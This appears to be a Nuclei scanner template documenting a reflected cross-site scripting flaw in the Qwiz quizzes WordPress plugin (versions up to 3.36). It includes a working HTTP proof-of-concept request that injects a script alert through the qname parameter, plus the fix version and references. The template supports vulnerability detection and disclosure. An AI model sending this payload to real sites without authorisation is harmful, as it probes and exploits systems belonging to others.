# Nuclei Template: Qwiz Online Quizzes And Flashcards <= 3.36 - Cross-Site Scripting
**Template ID:** wp-qwiz-online-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`wp-qwiz-online-xss.yaml`)

## Vulnerability Information & PoC

## Description
The qname, i_qwiz, session_id and username parameters passed to the registration_complete.php file are affected by XSS issues.

## Steps to reproduce / Exploit Payload
```http
GET /wp-content/plugins/qwiz-online-quizzes-and-flashcards/registration_complete.php?&qname=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: {{Hostname}}
```

## Remediation
Fixed in version 3.37

## References
- https://wpscan.com/vulnerability/d3c10f69-87b6-43fd-bcbc-c2d35b683ff4
- https://packetstormsecurity.com/files/154403/
- https://wordpress.org/plugins/qwiz-online-quizzes-and-flashcards/
